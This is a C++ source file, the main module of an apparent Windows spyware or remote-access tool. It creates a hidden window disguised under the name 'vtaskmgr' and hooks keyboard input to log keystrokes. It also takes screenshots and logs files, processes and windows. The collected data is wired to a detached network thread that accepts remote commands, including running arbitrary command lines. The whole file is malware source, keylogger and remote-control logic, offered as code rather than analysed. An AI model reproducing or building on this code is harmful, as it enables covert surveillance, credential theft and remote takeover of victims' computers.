
#include "main.h"
#include "log.h"
#include "screenshot.h"
#include "network.h"
#include "utils.h"

namespace core
{
	HWND wnd;
	logger::spy_t spy;
	network::network_t net;

	LRESULT CALLBACK wnd_proc(HWND hwnd, UINT message, UINT wparam, LONG lparam)
	{
		switch (message)
		{
			case WM_HOOKMESSAGE:
			{
				if (spy.keyboard)
					spy.keyboard->log(wparam);
				break;
			}
			case WM_DESTROY:
			case WM_ENDSESSION:
			{
				PostQuitMessage(NULL);
				break;
			}
		}

		return DefWindowProc(hwnd, message, wparam, lparam);
	}

	void init()
	{
		spy.init(wnd);

		init_callbacks();

		thread net_thread(boost::bind(&network::network_t::start, &net));
		net_thread.detach();
	}

	void init_callbacks()
	{
		using namespace logger;
		using namespace utils;
		using namespace capture;

		spy.keyboard->make_screenshot = boost::bind(&make_screenshot);
		spy.make_screenshot = boost::bind(&make_screenshot);
		net.make_screenshot = boost::bind(&make_screenshot, _1);
		net.log_keys = boost::bind(&keylogger_t::dump, spy.keyboard.get(), _1);
		net.log_directories = boost::bind(&file_logger_t::log_dump, spy.files.get());
		net.log_processes = boost::bind(&procs_logger_t::log_dump, spy.processes.get(), _1);
		net.log_windows = boost::bind(&windows_logger_t::log_dump, spy.windows.get(), _1);
		net.reset_tracking = boost::bind(&spy_t::track_program::reset, &spy.program);
		net.log_files = boost::bind(&file_logger_t::log_files_dump, spy.files.get(), _1);
		net.exec_line = boost::bind(&execute_cmdline, _1);
		net.message_box = boost::bind(&message_box, _1);
		net.track_processes = boost::bind(&spy_t::track_program::add_process, &spy.program, _1);
		net.track_windows = boost::bind(&spy_t::track_program::add_window, &spy.program, _1);
	}

	void init_window(HINSTANCE instance)
	{
		WNDCLASS wc;
		ZeroMemory(&wc, sizeof(WNDCLASS));
		wc.lpszClassName = L"vtaskmgr";
		wc.hInstance = instance;
		wc.lpfnWndProc = wnd_proc;
		RegisterClass(&wc);

		wnd = ::CreateWindowEx(0, L"vtaskmgr", L"vtaskmgr", WS_POPUP | WS_CAPTION | WS_SYSMENU 
			| WS_THICKFRAME, 0, 0, 200, 200, nullptr, nullptr, instance, nullptr);

		ShowWindow(wnd, SW_HIDE);
	}

	void message_loop()
	{
		MSG msg = { 0 };

		while (msg.message != WM_QUIT)
		{
			boost::this_thread::sleep_for(milliseconds(500));

			if (PeekMessage(&msg, nullptr, 0, 0, PM_REMOVE))
			{
				TranslateMessage(&msg);
				DispatchMessage(&msg);
			}
		}
	}

	void release()
	{

	}
}

int APIENTRY WinMain(HINSTANCE instance, HINSTANCE prev_instance, LPSTR cmd_line, int cmd_show)
{
	setlocale(LC_ALL, "Russian");

	try
	{
		core::init_window(instance);

		core::init();
	}
	catch (...) 
	{
		exit(EXIT_FAILURE);
	}

	core::message_loop();

	core::release();
	
	return EXIT_SUCCESS;
}